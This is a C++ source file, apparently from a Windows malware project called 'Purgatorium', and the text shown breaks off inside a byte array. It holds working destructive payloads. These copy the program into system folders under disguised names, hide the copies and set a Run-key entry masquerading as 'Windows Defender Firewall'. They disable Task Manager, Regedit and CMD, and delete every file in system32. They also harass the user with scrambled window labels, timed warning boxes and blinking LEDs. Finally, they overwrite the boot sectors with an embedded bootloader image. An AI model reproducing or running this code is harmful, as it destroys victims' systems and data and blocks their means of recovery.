typedef struct IUnknown IUnknown;

#pragma once

#include "Purgatorium.h"

DWORD consent = 0x00000001;

namespace Payloads
{
	//Generic infection
	VOID InfectSystem(VOID)
	{
		LPCWSTR path[] =
		{
			L"C:\\Program Files\\Internet Explorer\\Connection Wizard\\server.exe",
			L"C:\\WINDOWS\\system32\\oobe\\images\\heaven.png.exe",
			L"C:\\WINDOWS\\system32\\Purgatorium.exe",
			L"C:\\WINDOWS\\system32\\mgtqsvc.exe",
			L"C:\\WINDOWS\\bootcfg.dat"
		};

		//Copy all files and hide it
		for (int i = 0; i < 5; i++)
		{
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)path[i]);

			System::HideFile(path[i]);
		}

		//Makes Purgatorium load at startup until 2060
		System::SetRegValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"Windows Defender Firewall", REG_SZ, (LPBYTE)path[2], sizeof(path[2]) * 16);

		System::CreateRegKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		System::CreateRegKey(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System");

		//Disables TaskMgr, Regedit and CMD
		System::SetRegValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, (LPBYTE)&consent, sizeof(consent));
		System::SetRegValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistrytools", REG_DWORD, (LPBYTE)&consent, sizeof(consent));
		System::SetRegValue(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, (LPBYTE)&consent, sizeof(consent));
	}

	VOID DestroyFiles(VOID)
	{
		LPCWSTR lpFileLocal = L"C:\\WINDOWS\\system32\\*";

		WIN32_FIND_DATAW lpFindFileData;

		HANDLE hFindFile = FindFirstFileW(lpFileLocal, &lpFindFileData);

		lpFileLocal = L"C:\\WINDOWS\\system32\\";

		//Go to every file in system32 and try to delete it
		do
		{
			if (lpFindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
			{
				WCHAR lpFilePath[MAX_PATH];

				//Convert it to WCHAR
				wsprintfW(lpFilePath, L"%s%s", lpFileLocal, lpFindFileData.cFileName);

				DeleteFileW(lpFilePath);
			}
		} while (FindNextFileW(hFindFile, &lpFindFileData));

		FindClose(hFindFile);
	}

	//Put random strings in windows labels
	DWORD WINAPI MessLabels(LPVOID lpvd)
	{
		while (true)
		{
			HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
			EnumChildWindows(hwnd, System::EnumChildProc, NULL);
		}
	}

	//Show a message each 10 minutes
	DWORD WINAPI TimedMessages(LPVOID lpvd)
	{
		while (true)
		{
			//10 minutes
			Sleep(1000 * 600);

			MessageBoxW(NULL, L"THE END IS NEAR!!!", L"THE END IS NEAR!!!", MB_OK | MB_ICONEXCLAMATION);
		}

		return 0x00;
	}

	//Blink the LEDs of your keyboard
	DWORD WINAPI KeyboardPayload(LPVOID lpvd)
	{
		while (true)
		{
			System::PressKey(VK_CAPITAL, 1000);
			System::PressKey(VK_SCROLL,  1000);
		}

		return 0x00;
	}

	VOID OverwriteSectors(VOID)
	{
		//This contains the binary of my bootloader + kernel entirely made in Assembly
		const BYTE Infernum[3072] =
		{
			0xEB, 0x00, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBC, 0x00, 0x7C, 0x8E, 0xD0, 0xE8, 0x1C, 0x00,
			0xE8, 0x05, 0x00, 0xEA, 0x00, 0x7E, 0x00, 0x00, 0xB4, 0x02, 0xB0, 0x05, 0xB5, 0x00, 0xB1, 0x02,
			0xB6, 0x00, 0x31, 0xDB, 0x8E, 0xC3, 0xBB, 0x00, 0x7E, 0xCD, 0x13, 0xC3, 0xB8, 0x13, 0x00, 0xCD,
			0x10, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA,
			0xE8, 0x05, 0x00, 0xE8, 0x26, 0x00, 0xEB, 0xFE, 0x68, 0x00, 0xA0, 0x07, 0xB4, 0x0C, 0x30, 0xC0,
			0x31, 0xDB, 0x31, 0xC9, 0xBA, 0x08, 0x00, 0xDB, 0xE3, 0xC7, 0x06, 0xF8, 0x7E, 0x0E, 0x00, 0xC7,
			0x06, 0xF6, 0x7E, 0x10, 0x00, 0xBE, 0x29, 0x85, 0xE8, 0xA2, 0x00, 0xC3, 0x89, 0x0E, 0xD6, 0x82,
			0x89, 0x16, 0xD8, 0x82, 0x89, 0x0E, 0xDC, 0x82, 0x89, 0x16, 0xE0, 0x82, 0x81, 0x3E, 0xD4, 0x82,
			0x00, 0x0D, 0x0F, 0x87, 0x89, 0x04, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x0C, 0x0F, 0x87, 0xB2, 0x06,
			0x81, 0x3E, 0xD4, 0x82, 0x00, 0x0B, 0x0F, 0x87, 0x7B, 0x06, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x0A,
			0x0F, 0x87, 0x3E, 0x06, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x09, 0x0F, 0x87, 0x13, 0x06, 0x81, 0x3E,
			0xD4, 0x82, 0x00, 0x08, 0x0F, 0x87, 0xE8, 0x05, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x07, 0x0F, 0x87,
			0xBD, 0x05, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x06, 0x0F, 0x87, 0x92, 0x05, 0x81, 0x3E, 0xD4, 0x82,
			0x00, 0x05, 0x0F, 0x87, 0x67, 0x05, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x04, 0x0F, 0x87, 0x3C, 0x05,
			0x81, 0x3E, 0xD4, 0x82, 0x00, 0x03, 0x0F, 0x87, 0x05, 0x05, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x02,
			0x0F, 0x87, 0xD4, 0x04, 0x81, 0x3E, 0xD4, 0x82, 0x00, 0x01, 0x0F, 0x87, 0xA3, 0x04, 0x83, 0x3E,
			0xD4, 0x82, 0x1E, 0x0F, 0x87, 0x76, 0x04, 0x0F, 0x82, 0xE5, 0x00, 0xEB, 0x42, 0x60, 0xB4, 0x0E,
			0x8A, 0x04, 0x30, 0xFF, 0x8A, 0x1E, 0xF8, 0x7E, 0xFE, 0xC3, 0x3A, 0x1E, 0xF6, 0x7E, 0x74, 0xF4,
			0xCD, 0x10, 0x46, 0x8A, 0x04, 0x3C, 0x00, 0x75, 0xEF, 0x61, 0xC3, 0x60, 0xB4, 0x02, 0x30, 0xFF,
			0x31, 0xD2, 0xCD, 0x10, 0x61, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC9, 0xBA, 0x08, 0x00, 0xFF,
			0x06, 0xD4, 0x82, 0xD9, 0x06, 0x2A, 0x83, 0xD8, 0x06, 0x22, 0x83, 0xD9, 0x1E, 0x22, 0x83, 0x81,
			0xF9, 0x40, 0x01, 0x73, 0x0D, 0x81, 0xFA, 0xC8, 0x00, 0x73, 0xDF, 0xCD, 0x10, 0x41, 0xE9, 0x0B,
			0xFF, 0xC3, 0x31, 0xC9, 0x42, 0xE9, 0x04, 0xFF, 0x3A, 0x06, 0x8A, 0x7F, 0x77, 0x0E, 0x3A, 0x06,
			0x8C, 0x7F, 0x72, 0x02, 0xEB, 0xD9, 0x02, 0x06, 0x8E, 0x7F, 0xEB, 0xEC, 0x2A, 0x06, 0x90, 0x7F,
			0xEB, 0xE6, 0x60, 0xBA, 0xC8, 0x03, 0x88, 0xD8, 0xEE, 0xBA, 0xC9, 0x03, 0x30, 0xC0, 0xEE, 0x88,
			0xD8, 0xEE, 0x30, 0xC0, 0xEE, 0x43, 0x81, 0xFB, 0xFF, 0x00, 0x72, 0xE7, 0x61, 0xC3, 0xC6, 0x06,
			0x8A, 0x7F, 0x37, 0xC6, 0x06, 0x8C, 0x7F, 0x20, 0xC3, 0xC6, 0x06, 0x8A, 0x7F, 0x1F, 0xC6, 0x06,
			0x8C, 0x7F, 0x10, 0xC3, 0xC6, 0x06, 0x8A, 0x7F, 0x67, 0xC6, 0x06, 0x8C, 0x7F, 0x50, 0xC3, 0xC6,
			0x06, 0x8A, 0x7F, 0x0F, 0xC6, 0x06, 0x8C, 0x7F, 0x00, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00,
			0x10, 0x00, 0x60, 0xB0, 0xB6, 0xE6, 0x43, 0xB8, 0x2C, 0x01, 0xC0, 0xE8, 0x06, 0xE6, 0x42, 0xE4,
			0x61, 0x0C, 0x03, 0xE6, 0x61, 0x61, 0xC3, 0x60, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0x61, 0xC3,
			0xE8, 0xDF, 0xFF, 0xDB, 0x06, 0xD6, 0x82, 0xD9, 0xFE, 0xD9, 0x1E, 0xD6, 0x82, 0xA0, 0xD6, 0x82,
			0x02, 0x06, 0xD4, 0x82, 0x02, 0x06, 0xD4, 0x82, 0x02, 0x06, 0xD4, 0x82, 0x02, 0x06, 0xD4, 0x82,
			0x02, 0x06, 0xD4, 0x82, 0x02, 0x06, 0xD4, 0x82, 0xE8, 0x8E, 0xFF, 0xE9, 0x4A, 0xFF, 0x51, 0x52,
			0x03, 0x0E, 0xD4, 0x82, 0x03, 0x16, 0xD4, 0x82, 0x21, 0xD1, 0x31, 0xCA, 0x89, 0x0E, 0xD6, 0x82,
			0x89, 0x16, 0xD8, 0x82, 0x5A, 0x59, 0xDB, 0x06, 0xD6, 0x82, 0xD9, 0xFE, 0xD9, 0x1E, 0xF6, 0x82,
			0xA0, 0xF6, 0x82, 0xC0, 0xE8, 0x06, 0x2A, 0x06, 0x28, 0x7F, 0x2C, 0x02, 0xE8, 0x4F, 0xFF, 0xE9,
			0x16, 0xFF, 0x51, 0x03, 0x0E, 0xD4, 0x82, 0x89, 0x0E, 0xDC, 0x82, 0x59, 0xDB, 0x06, 0xDC, 0x82,
			0xD8, 0x36, 0xEE, 0x82, 0xD9, 0xFE, 0xD8, 0x36, 0xE8, 0x82, 0xD8, 0x0E, 0xE8, 0x82, 0xD8, 0x06,
			0xE8, 0x82, 0xD9, 0x1E, 0xEC, 0x82, 0xDB, 0x06, 0xE0, 0x82, 0xD8, 0x36, 0xEE, 0x82, 0xD9, 0xFE,
			0xD8, 0x36, 0xE8, 0x82, 0xD8, 0x0E, 0xE8, 0x82, 0xD8, 0x06, 0xE8, 0x82, 0xD8, 0x06, 0xEC, 0x82,
			0xD9, 0x1E, 0xEA, 0x82, 0xA0, 0xEA, 0x82, 0xD0, 0xE8, 0x2A, 0x06, 0xD4, 0x82, 0xE8, 0xFE, 0xFE,
			0xE9, 0xC5, 0xFE, 0x81, 0x2E, 0xD6, 0x82, 0xA0, 0x00, 0x83, 0x2E, 0xD8, 0x82, 0x64, 0xDB, 0x06,
			0xFA, 0x82, 0xD9, 0xFE, 0xD9, 0x1E, 0x0E, 0x83, 0xDB, 0x06, 0xFA, 0x82, 0xD9, 0xFF, 0xD9, 0x1E,
			0x0A, 0x83, 0xDB, 0x06, 0xD6, 0x82, 0xD8, 0x0E, 0x0A, 0x83, 0xD9, 0x1E, 0xF2, 0x82, 0xDB, 0x06,
			0xD8, 0x82, 0xD8, 0x0E, 0x0E, 0x83, 0xD9, 0x1E, 0xF6, 0x82, 0xDB, 0x06, 0xF2, 0x82, 0xD8, 0x26,
			0xF6, 0x82, 0xD9, 0x1E, 0xE4, 0x82, 0x8B, 0x1E, 0xE4, 0x82, 0x88, 0xD8, 0x2A, 0x06, 0xD4, 0x82,
			0xE8, 0xB6, 0xFE, 0xE9, 0x72, 0xFE, 0xDF, 0x2E, 0x12, 0x83, 0xD9, 0xFE, 0xD8, 0x0E, 0xE0, 0x82,
			0xD9, 0x1E, 0xF2, 0x82, 0xDF, 0x2E, 0x12, 0x83, 0xD9, 0xFF, 0xD8, 0x0E, 0xDC, 0x82, 0xD8, 0x26,
			0xF2, 0x82, 0xD9, 0x1E, 0xE4, 0x82, 0xDF, 0x2E, 0x12, 0x83, 0xD9, 0xFF, 0xD8, 0x0E, 0xE0, 0x82,
			0xD9, 0x1E, 0xF6, 0x82, 0xDF, 0x2E, 0x12, 0x83, 0xD9, 0xFE, 0xD8, 0x0E, 0xDC, 0x82, 0xD8, 0x06,
			0xF6, 0x82, 0xD9, 0x1E, 0xE6, 0x82, 0xD1, 0x2E, 0xE4, 0x82, 0xD1, 0x2E, 0xE6, 0x82, 0x8B, 0x1E,
			0xD4, 0x82, 0x21, 0x1E, 0xE4, 0x82, 0x21, 0x1E, 0xE6, 0x82, 0x8B, 0x1E, 0xE4, 0x82, 0x03, 0x1E,
			0xE6, 0x82, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xE8, 0x44, 0xFE, 0xE9, 0x0B, 0xFE, 0xDB, 0x06, 0xD6,
			0x82, 0xDB, 0x06, 0xD8, 0x82, 0xDE, 0xF9, 0xD9, 0x1E, 0xFE, 0x82, 0xA0, 0xFE, 0x82, 0xC0, 0xE8,
			0x04, 0x2A, 0x06, 0xD4, 0x82, 0xE8, 0x3C, 0xFE, 0xE9, 0xED, 0xFD, 0x52, 0x03, 0x16, 0xD4, 0x82,
			0x89, 0x16, 0xE0, 0x82, 0x5A, 0xDB, 0x06, 0xDC, 0x82, 0xD8, 0x0E, 0xDC, 0x82, 0xD9, 0x1E, 0xF2,
			0x82, 0xDB, 0x06, 0xE0, 0x82, 0xD8, 0x0E, 0xE0, 0x82, 0xD9, 0x1E, 0xF6, 0x82, 0x8B, 0x1E, 0xF2,
			0x82, 0xF7, 0xD3, 0x09, 0x1E, 0xF6, 0x82, 0xA0, 0xF6, 0x82, 0xC0, 0xE8, 0x04, 0x02, 0x06, 0xD4,
			0x82, 0x02, 0x06, 0x28, 0x7F, 0x0A, 0x06, 0xD4, 0x82, 0xE8, 0x03, 0xFE, 0xE9, 0xA9, 0xFD, 0xDB,
			0x06, 0xD6, 0x82, 0xD8, 0x0E, 0xD8, 0x82, 0xD9, 0x1E, 0xD6, 0x82, 0xA0, 0xD6, 0x82, 0xC0, 0xE8,
			0x04, 0x2A, 0x06, 0xD4, 0x82, 0xE8, 0xD1, 0xFD, 0xE9, 0x8D, 0xFD, 0x51, 0x52, 0x31, 0xD1, 0xF7,
			0xD1, 0x2B, 0x0E, 0xD4, 0x82, 0x01, 0xCA, 0x21, 0xCA, 0x88, 0xD0, 0x5A, 0x59, 0x02, 0x06, 0xD4,
			0x82, 0xC0, 0xE8, 0x02, 0xE8, 0xC8, 0xFD, 0xE9, 0x6E, 0xFD, 0x52, 0x03, 0x16, 0xD4, 0x82, 0x01,
			0x16, 0xD6, 0x82, 0x5A, 0xDB, 0x06, 0xD6, 0x82, 0xD8, 0x0E, 0xD8, 0x82, 0xD9, 0x1E, 0xD6, 0x82,
			0xA0, 0xD6, 0x82, 0xC0, 0xE8, 0x02, 0x2A, 0x06, 0xD4, 0x82, 0xE8, 0x97, 0xFD, 0xE9, 0x48, 0xFD,
			0x51, 0x52, 0x03, 0x0E, 0xD4, 0x82, 0x31, 0xD1, 0xF7, 0xD2, 0x89, 0x0E, 0xDC, 0x82, 0x89, 0x16,
			0xE0, 0x82, 0x5A, 0x59, 0xDB, 0x06, 0xDC, 0x82, 0xD8, 0x0E, 0xDC, 0x82, 0xD9, 0xFE, 0xD9, 0x1E,
			0xF2, 0x82, 0xDB, 0x06, 0xE0, 0x82, 0xD8, 0x0E, 0xE0, 0x82, 0xD9, 0xFE, 0xD9, 0x1E, 0xF6, 0x82,
			0x8B, 0x1E, 0xF2, 0x82, 0x01, 0x1E, 0xF6, 0x82, 0xA0, 0xF6, 0x82, 0xC0, 0xE8, 0x04, 0x02, 0x06,
			0xD4, 0x82, 0xE8, 0x39, 0xFD, 0xE9, 0x00, 0xFD, 0xDB, 0x06, 0xDC, 0x82, 0xD8, 0x0E, 0xDC, 0x82,
			0xD9, 0x1E, 0xF2, 0x82, 0xDB, 0x06, 0xE0, 0x82, 0xD8, 0x0E, 0xE0, 0x82, 0xD9, 0x1E, 0xF6, 0x82,
			0x8B, 0x1E, 0xF2, 0x82, 0x2B, 0x1E, 0xF6, 0x82, 0xC1, 0xDB, 0x06, 0x88, 0xD8, 0xC0, 0xE8, 0x04,
			0x2A, 0x06, 0xD4, 0x82, 0xE9, 0xD1, 0xFC, 0x89, 0x0E, 0xDC, 0x82, 0x89, 0x16, 0xE0, 0x82, 0x66,
			0xC1, 0x2E, 0xDC, 0x82, 0x04, 0x66, 0xC1, 0x2E, 0xE0, 0x82, 0x04, 0x8B, 0x1E, 0xE0, 0x82, 0x01,
			0x1E, 0xDC, 0x82, 0xA0, 0xDC, 0x82, 0x02, 0x06, 0xD4, 0x82, 0xE8, 0xE1, 0xFC, 0xE9, 0xA8, 0xFC,
			0xDF, 0x2E, 0x22, 0x83, 0xD9, 0xFE, 0xD8, 0x0E, 0xE0, 0x82, 0xD9, 0x1E, 0xF2, 0x82, 0xDF, 0x2E,
			0x22, 0x83, 0xD9, 0xFF, 0xD8, 0x0E, 0xDC, 0x82, 0xD8, 0x26, 0xF2, 0x82, 0xD9, 0x1E, 0xE4, 0x82,
			0xDF, 0x2E, 0x22, 0x83, 0xD9, 0xFF, 0xD8, 0x0E, 0xE0, 0x82, 0xD9, 0x1E, 0xF6, 0x82, 0xDF, 0x2E,
			0x22, 0x83, 0xD9, 0xFE, 0xD8, 0x0E, 0xDC, 0x82, 0xD8, 0x06, 0xF6, 0x82, 0xD9, 0x1E, 0xE6, 0x82,
			0x8B, 0x1E, 0xE4, 0x82, 0x33, 0x1E, 0xE6, 0x82, 0x88, 0xD8, 0xD0, 0xE8, 0xE9, 0x40, 0xFC, 0xB8,
			0x03, 0x00, 0xCD, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x5C, 0x00, 0x5C, 0x00, 0x00,
			0x40, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0xA0, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x99, 0x99, 0x99, 0x99, 0x99,
			0xB9, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x99, 0x99, 0x99, 0x99, 0x99,
			0xB9, 0x3F, 0xE8, 0xB6, 0xFB, 0xE8, 0x95, 0xFB, 0xFE, 0x85, 0x67, 0x87, 0xC3, 0x80, 0x3E, 0x67,
			0x87, 0x00, 0x0F, 0x85, 0x98, 0xFC, 0xE8, 0x5E, 0xFC, 0xC7, 0x06, 0xF8, 0x7E, 0x34, 0x00, 0xC7,
			0x06, 0xF6, 0x7E, 0x37, 0x00, 0xBE, 0x52, 0x85, 0xBF, 0x00, 0x00, 0xE8, 0xD4, 0xFF, 0xE9, 0x7D,
			0xFC, 0x80, 0x3E, 0x68, 0x87, 0x00, 0x0F, 0x85, 0xA8, 0xFC, 0xC7, 0x06, 0xF8, 0x7E, 0x40, 0x00,
			0xC7, 0x06, 0xF6, 0x7E, 0x4F, 0x00, 0xC7, 0x06, 0x90, 0x7F, 0x1F, 0x00, 0xBE, 0x7B, 0x85, 0xBF,
			0x01, 0x00, 0xE8, 0xAD, 0xFF, 0xE9, 0x8A, 0xFC, 0x80, 0x3E, 0x69, 0x87, 0x00, 0x0F, 0x85, 0xD2,
			0xFC, 0xC7, 0x06, 0xF8, 0x7E, 0x0E, 0x00, 0xC7, 0x06, 0xF6, 0x7E, 0x10, 0x00, 0xC7, 0x06, 0x90,
			0x7F, 0x10, 0x00, 0xBE, 0xA4, 0x85, 0xBF, 0x02, 0x00, 0xE8, 0x86, 0xFF, 0xE9, 0xB4, 0xFC, 0xDB,
			0x06, 0x1A, 0x83, 0xD8, 0x36, 0x12, 0x83, 0xD9, 0x1E, 0x12, 0x83, 0x80, 0x3E, 0x6A, 0x87, 0x00,
			0x0F, 0x85, 0xF2, 0xFC, 0xC7, 0x06, 0xF8, 0x7E, 0x20, 0x00, 0xC7, 0x06, 0xF6, 0x7E, 0x37, 0x00,
			0xBE, 0xCD, 0x85, 0xBF, 0x03, 0x00, 0xE8, 0x59, 0xFF, 0xE9, 0xDA, 0xFC, 0x80, 0x3E, 0x6B, 0x87,
			0x00, 0x0F, 0x85, 0x38, 0xFD, 0xC7, 0x06, 0xF8, 0x7E, 0x50, 0x00, 0xC7, 0x06, 0xF6, 0x7E, 0x67,
			0x00, 0xBE, 0xF6, 0x85, 0xBF, 0x04, 0x00, 0xE8, 0x38, 0xFF, 0xE9, 0x20, 0xFD, 0x80, 0x3E, 0x6C,
			0x87, 0x00, 0x0F, 0x85, 0x35, 0xFD, 0xC7, 0x06, 0xF8, 0x7E, 0x50, 0x00, 0xC7, 0x06, 0xF6, 0x7E,
			0x54, 0x00, 0xBE, 0x1F, 0x86, 0xBF, 0x05, 0x00, 0xE8, 0x17, 0xFF, 0xE9, 0x1D, 0xFD, 0x80, 0x3E,
			0x6D, 0x87, 0x00, 0x0F, 0x85, 0x58, 0xFD, 0xC7, 0x06, 0xF8, 0x7E, 0x1C, 0x00, 0xC7, 0x06, 0xF6,
			0x7E, 0x20, 0x00, 0xBE, 0x48, 0x86, 0xBF, 0x06, 0x00, 0xE8, 0xF6, 0xFE, 0xE9, 0x40, 0xFD, 0x80,
			0x3E, 0x6E, 0x87, 0x00, 0x0F, 0x85, 0x53, 0xFD, 0xC7, 0x06, 0xF8, 0x7E, 0x01, 0x00, 0xC7, 0x06,
			0xF6, 0x7E, 0x10, 0x00, 0xBE, 0x71, 0x86, 0xBF, 0x07, 0x00, 0xE8, 0xD5, 0xFE, 0xE9, 0x3B, 0xFD,
			0x80, 0x3E, 0x6F, 0x87, 0x00, 0x0F, 0x85, 0x51, 0xFD, 0xC7, 0x06, 0xF8, 0x7E, 0x62, 0x00, 0xC7,
			0x06, 0xF6, 0x7E, 0x66, 0x00, 0xBE, 0x9A, 0x86, 0xBF, 0x08, 0x00, 0xE8, 0xB4, 0xFE, 0xE9, 0x39,
			0xFD, 0x80, 0x3E, 0x70, 0x87, 0x00, 0x0F, 0x85, 0x56, 0xFD, 0xC7, 0x06, 0xF8, 0x7E, 0x47, 0x00,
			0xC7, 0x06, 0xF6, 0x7E, 0x4A, 0x00, 0xBE, 0xC3, 0x86, 0xBF, 0x09, 0x00, 0xE8, 0x93, 0xFE, 0xE9,
			0x3E, 0xFD, 0x80, 0x3E, 0x71, 0x87, 0x00, 0x0F, 0x85, 0x7D, 0xFD, 0xC7, 0x06, 0x8A, 0x7F, 0x1F,
			0x00, 0xC7, 0x06, 0x8C, 0x7F, 0x19, 0x00, 0xC7, 0x06, 0xF8, 0x7E, 0x1C, 0x00, 0xC7, 0x06, 0xF6,
			0x7E, 0x20, 0x00, 0xC7, 0x06, 0x8E, 0x7F, 0x14, 0x00, 0xBE, 0xEC, 0x86, 0xBF, 0x0A, 0x00, 0xE8,
			0x60, 0xFE, 0xE9, 0x53, 0xFD, 0x80, 0x3E, 0x72, 0x87, 0x00, 0x0F, 0x85, 0x79, 0xFD, 0xC7, 0x06,
			0xF6, 0x7E, 0x38, 0x00, 0xC7, 0x06, 0xF8, 0x7E, 0x1F, 0x00, 0xC7, 0x06, 0x8E, 0x7F, 0x20, 0x00,
			0xC7, 0x06, 0x90, 0x7F, 0x1F, 0x00, 0xBE, 0x15, 0x87, 0xBF, 0x0B, 0x00, 0xE8, 0x33, 0xFE, 0xE9,
			0x55, 0xFD, 0x80, 0x3E, 0x73, 0x87, 0x00, 0x0F, 0x85, 0x75, 0xFD, 0xBB, 0x00, 0x00, 0xE8, 0x31,
			0xFA, 0xC7, 0x06, 0xF8, 0x7E, 0x34, 0x00, 0xC7, 0x06, 0xF6, 0x7E, 0x36, 0x00, 0xBE, 0x3E, 0x87,
			0xBF, 0x0C, 0x00, 0xE8, 0x0C, 0xFE, 0xE9, 0x57, 0xFD, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x57, 0x65, 0x6C, 0x63, 0x6F, 0x6D, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x6D, 0x79, 0x20, 0x50, 0x75,
			0x72, 0x67, 0x61, 0x74, 0x6F, 0x72, 0x69, 0x75, 0x6D, 0x21, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
			0x20, 0x00, 0x54, 0x68, 0x69, 0x73, 0x20, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x6F, 0x66, 0x20,
			0x66, 0x65, 0x65, 0x6C, 0x69, 0x6E, 0x67, 0x73, 0x20, 0x69, 0x73, 0x20, 0x6D, 0x79, 0x20, 0x6F,
